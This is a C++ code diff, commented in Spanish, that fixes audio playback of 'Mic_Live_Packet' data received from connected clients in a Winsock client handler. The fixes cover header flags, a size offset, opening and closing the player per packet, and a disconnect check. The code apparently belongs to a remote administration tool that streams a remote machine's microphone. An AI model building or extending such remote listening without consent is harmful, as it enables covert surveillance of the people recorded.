@@ -41,9 +41,10 @@ bool Cliente_Handler::OpenPlayer() {
 void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
     
     WAVEHDR header = {};
-
+    header.dwFlags = 0;
     header.lpData = pBuffer;
     header.dwBufferLength = iLen;
+     
 
     if (waveOutPrepareHeader(this->wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
         std::cerr << "Error al preparar el encabezado del buffer de audio" << std::endl;
@@ -51,6 +52,7 @@ void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
         waveOutClose(this->wo);
         return;
     }
+
     if (waveOutWrite(this->wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
         std::cerr << "Error al escribir el buffer de audio en el dispositivo de reproducci�n" << std::endl;
         waveOutUnprepareHeader(this->wo, &header, sizeof(header));
@@ -92,11 +94,7 @@ void Cliente_Handler::Spawn_Handler(){
 
         /*Desconexion del cliente
         Si no recibio nada y el error no es timeout*/
-        //if ((this->BytesRecibidos() <= 0 && error_code != WSAETIMEDOUT)
-            /*O si el cliente se desconecto*/
-            //|| this->BytesRecibidos() == WSAECONNRESET) {
-            if(this->BytesRecibidos() == WSAECONNRESET) {
-            
+        if(this->BytesRecibidos() == WSAECONNRESET) {
             //Cambiar titulo de ventana si esta sigue abierta
             FrameCliente* temp_cli = (FrameCliente*)wxWindow::FindWindowByName(this->p_Cliente._id);
             if (temp_cli) {
@@ -410,10 +408,16 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         if (vcDatos[0] == std::to_string(EnumComandos::Mic_Live_Packet)) {
-            int iHeadSize = vcDatos[0].size() - 1;
-            int iRawSize = this->BytesRecibidos() - iHeadSize;
-            char* cBuff = cBuffer.get() + iHeadSize;
-            this->PlayBuffer(cBuff, iRawSize);
+            if (this->OpenPlayer()) {
+                int iHeadSize = vcDatos[0].size() + 1;
+                int iRawSize = this->BytesRecibidos() - iHeadSize;
+                char* cBuff = cBuffer.get() + iHeadSize;
+                this->PlayBuffer(cBuff, iRawSize);
+
+                this->ClosePlayer();
+            }else {
+                this->Log("No se pudo abrir el reproductor");
+            }
             continue;
         }
 
